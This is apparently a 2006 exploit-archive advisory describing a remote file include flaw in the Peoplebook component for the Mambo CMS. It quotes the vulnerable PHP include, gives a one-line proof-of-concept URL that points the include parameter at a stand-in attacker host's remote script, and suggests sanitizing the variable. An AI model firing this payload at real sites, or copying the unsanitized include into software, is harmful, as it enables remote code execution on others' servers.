@@ -1,0 +1,72 @@
+---------------------------------------------------------------------------
+Peoplebook Mambo Component <= v1.0 Remote File Include Vulnerabilities
+---------------------------------------------------------------------------
+
+Author          : Matdhule
+Date            : August, 14th 2006
+Location        : Indonesia, Jakarta
+Critical Lvl    : Highly critical
+Impact          : System access
+Where           : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Peoplebook Component
+
+Application     : Peoplebook Component
+version         : 1.0
+URL             : www.mamboforge.net/projects/peoplebook
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+
+in folder com_peoplebook we found vulnerability script param.peoplebook.php.
+
+-----------------------param.peoplebook.php----------------------
+....
+<?php
+
+if (file_exists($mosConfig_absolute_path.'/components/com_peoplebook/languages/'.$selected_lang.'.php')) {
+   require_once ($mosConfig_absolute_path.'/components/com_peoplebook/languages/'.$selected_lang.'.php');
+}
+else {
+   require_once ($mosConfig_absolute_path.'/components/com_peoplebook/languages/english.php');
+}
+...
+----------------------------------------------------------
+
+Variables $mosConfig_absolute_path are not properly sanitized. When register_globals=on
+and allow_fopenurl=on an attacker can exploit this vulnerability with a
+simple php injection script.
+
+Proof Of Concept:
+~~~~~~~~~~~~~~~
+
+http://[target]/[path]/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path= http://attacker.com/evil.txt?
+
+Solution:
+~~~~~~~
+
+sanitize variabel $mosConfig_absolute_path in param.peoplebook.php
+
+
+---------------------------------------------------------------------------
+Shoutz:
+~~~~~
+~ solpot a.k.a chris, J4mbi  H4ck3r for the hacking lesson :)
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous
+~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama
+~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com
+~ #mardongan #jambihackerlink #e-c-h-o @ irc.dal.net
+---------------------------------------------------------------------------
+Contact:
+~~~~~~
+
+     matdhule[at]gmail[dot]com
+     
+-------------------------------- [ EOF ] ---------------------------------- 
+
+# milw0rm.com [2006-08-14]
